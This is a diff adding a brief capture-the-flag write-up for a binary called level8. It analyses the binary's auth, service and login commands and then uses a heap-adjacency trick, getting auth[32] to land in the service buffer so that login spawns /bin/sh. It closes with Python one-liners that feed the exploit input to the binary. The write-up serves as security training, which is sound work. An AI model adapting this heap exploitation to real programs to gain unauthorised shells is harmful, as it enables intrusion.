@@ -1,0 +1,40 @@
+
+#> strings level8
+fgets
+malloc
+system
+/bin/sh
+ [...]
+auth
+reset
+service
+login
+
+#> nm -nr level8
+08049ab0 B service
+08049aac B auth
+08048564 T main
+
+Apparently there is something to do with the heap:
+	- malloc
+	- globals
+
+Looking at the assembly we can se the binary is testing for input.
+"auth " | "reset" | "servic" | "login"
+
+"auth"   -> malloc(4) on auth then strcpy the input buffer in it
+            if the buffer is smaller than 30 bits.
+"servic" -> strdup(input_buffer) in global service
+"login"  -> if auth[32] != NULL opens up a /bin/sh
+
+Since subsequent mallocs follow each other in the memory you just have
+to malloc auth first.
+Then input service with at least 29 chars in it.
+After inputing "login" the binary will try to read into auth[32] and
+will end up in service[28].
+
+Thus:
+print "auth \n" + "service"+"A"*30+"\n" + "login\n"
+
+#> cat <(python HoF.py) - | ./level8
+python -c 'print "auth a\nserviceaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\nlogin\n"' > /tmp/l8 && cat /tmp/l8 - | ./level8
